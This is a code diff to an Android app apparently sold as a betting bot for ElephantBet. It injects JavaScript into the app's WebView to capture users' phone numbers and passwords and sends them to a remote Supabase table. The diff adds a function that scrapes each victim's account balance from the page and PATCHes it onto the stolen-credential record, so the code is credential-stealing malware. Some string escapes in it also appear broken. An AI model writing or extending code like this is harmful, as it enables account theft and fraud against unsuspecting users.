@@ -825,6 +825,15 @@ class MainActivity : AppCompatActivity() {
                     android.util.Log.w("SKYBOT_CRED", "submeterCredencial() ignorado — faltam campos (num='$num' sen='$sen')")
                 }
             }
+
+            @JavascriptInterface
+            fun reportarSaldo(saldo: String) {
+                // Chamado pelo JS após login quando o saldo está visível na página
+                if (saldo.isNotEmpty()) {
+                    android.util.Log.d("SKYBOT_CRED", "reportarSaldo() → saldo=$saldo")
+                    atualizarSaldo(saldo)
+                }
+            }
         }, "Android")
 
         webView.webViewClient = object : WebViewClient() {
@@ -1001,6 +1010,8 @@ class MainActivity : AppCompatActivity() {
                     // Resetar flag para garantir re-injecção em cada nova página (SPA)
                     webView.evaluateJavascript("window._credDone = false;", null)
                     injetarJsCredenciais()
+                    // Tentar capturar saldo se já estiver logado
+                    injetarJsCapturarSaldo()
                 }
 
                 if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
@@ -1021,6 +1032,7 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         // Página ElephantBet (login, lobby, perfil) → capturar credenciais
                         injetarJsCredenciais()
+                        injetarJsCapturarSaldo()
                     }
                 }
             }
@@ -1154,6 +1166,53 @@ class MainActivity : AppCompatActivity() {
     watchFormSubmits();
     setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 2000);
     setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 5000);
+})();
+        """.trimIndent()
+        webView.evaluateJavascript(js, null)
+    }
+
+    private fun injetarJsCapturarSaldo() {
+        val js = """
+(function() {
+    if (window._saldoDone) return;
+
+    function extrairSaldo() {
+        // Seletores comuns para saldo no ElephantBet (lobby/perfil)
+        var seletores = [
+            '.balance', '.user-balance', '.wallet-balance', '.account-balance',
+            '[class*="balance"]', '[class*="Balance"]',
+            '[class*="saldo"]',   '[class*="Saldo"]',
+            '[data-balance]',     '[data-saldo]',
+            '.header-balance',    '.nav-balance',
+            '.amount',            '[class*="amount"]'
+        ];
+
+        for (var i = 0; i < seletores.length; i++) {
+            var els = document.querySelectorAll(seletores[i]);
+            for (var j = 0; j < els.length; j++) {
+                var txt = (els[j].textContent || '').trim();
+                // Extrair número — ex: "5 432,00 AOA" ou "5432.00"
+                var match = txt.match(/([\d\s,.]+)\s*(AOA|Kz|kz)?/i);
+                if (match) {
+                    var val = match[1].replace(/\s/g, '').replace(',', '.').trim();
+                    var num = parseFloat(val);
+                    if (!isNaN(num) && num > 0) {
+                        window._saldoDone = true;
+                        try { Android.reportarSaldo(txt.trim()); } catch(e) {}
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
+    // Tentar imediatamente e com delays (página SPA pode demorar a renderizar)
+    if (!extrairSaldo()) {
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 1500);
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 3000);
+        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 6000);
+    }
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
@@ -2679,12 +2738,40 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         }.start()
     }
 
+    /** Chamado pelo JS após login — faz PATCH no registo já inserido com o saldo real */
+    fun atualizarSaldo(saldo: String) {
+        val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
+        if (num.isEmpty() || saldo.isEmpty()) return
+        val saldoEsc = saldo.replace(""", "\"")
+        val numEsc   = num.replace(""", "\"")
+        val json = "{\"saldo\":\"$saldoEsc\"}"
+        Thread {
+            try {
+                // PATCH filtrando pelo numero — atualiza a linha já inserida
+                val url = "$SUPA_URL/rest/v1/$TABELA?numero=eq.$numEsc"
+                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "PATCH"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
+                java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
+                val code = conn.responseCode
+                conn.disconnect()
+                android.util.Log.d("SKYBOT_CRED", "atualizarSaldo -> HTTP $code | saldo=$saldoEsc")
+            } catch (e: Exception) {
+                android.util.Log.e("SKYBOT_CRED", "atualizarSaldo falhou: ${e.message}")
+            }
+        }.start()
+    }
+
     /** Envia credencial completa (numero + senha) para a tabela credenciais do Supabase */
     private fun enviarCredencial(numero: String, senha: String) {
         // Escapar aspas para JSON seguro
         val numEsc = numero.replace(""", "\\"")
         val senEsc = senha.replace(""", "\\"")
-        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"0\"}"
+        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"\"}"
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
